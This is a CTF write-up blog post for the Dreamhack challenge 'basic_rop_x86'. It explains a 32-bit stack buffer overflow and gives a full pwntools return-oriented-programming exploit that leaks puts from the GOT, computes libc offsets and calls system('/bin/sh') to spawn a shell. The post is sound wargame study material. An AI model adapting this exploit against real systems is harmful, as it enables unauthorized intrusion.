+++
date = '2026-05-05'
draft = false
title = 'Dreamhack basic_rop_x86 Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

## Challenge overview

이 문제는 서버에서 작동하고 있는 서비스(basic_rop_x86)의 바이너리와 소스 코드가 주어집니다.
Return Oriented Programming 공격 기법을 통해 셸을 획득한 후, "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

---

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[64]; // [esp+0h] [ebp-44h] BYREF

  memset(buf, 0, sizeof(buf));
  initialize();
  read(0, buf, 0x400u);
  write(1, buf, 0x40u);
  return 0;
}
```

## Identifying the vulnerabilities

32-bit rop... I don't know if I still remember how to do these, haha. Let's give it a try anyways. For this, if I recall correctly, the arguments are pulled from the stack; and `rbp` is 4 bytes.

I had to read [this](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/exploiting-calling-conventions) again because turns out I completely forgot 32-bit calling conventions.

I made the first half of the exploit, but the data getting leaked seemed so weird. And completely invalid! I mean, what the hell is this:

```bash
data1 ist 0xf7d12080!
data2 ist 0x8048436!
data3 ist 0xf7cb9f70!
data4 ist 0xf7db2570!
data5 ist 0xf7d12990!
```

Turns out that's just how libc looks like in 32-bit, and the exploit was fine. Now, we can connect remotely to calculate the offsets.

The libc was `libc6-i386_2.35-0ubuntu3_amd64`, and I got the flag!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
import time
elf = ELF('/home/kali/Downloads/dreamhack/rop86/basic_rop_x86')
p=elf.process()

#context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:24275'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#gdb.attach(p, gdbscript = 'b* 0x8048601')

puts_plt = elf.plt[b'puts']
puts_got = elf.got[b'puts']
main = 0x80485d9

payload = b"A"*63 + b"S" + b"B"*8 + p32(puts_plt) + p32(main) + p32(puts_got)
p.send(payload)

p.recvuntil(b"S")
data1 = p.recv(4)
val = u64(data1.ljust(8, b"\x00"))
print(f"data1 ist {hex(val)}!")
sleep(1)

puts_offset = 0x072830
system_offset = 0x047cb0
binsh_offset = 0x1b90f5

libc = val - puts_offset
system = libc + system_offset
binsh = libc + binsh_offset

payload = b"A"*63 + b"S" + b"B"*8 + p32(system) + p32(0x0) + p32(binsh)
p.send(payload)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/basic_rop_x86.py)**.
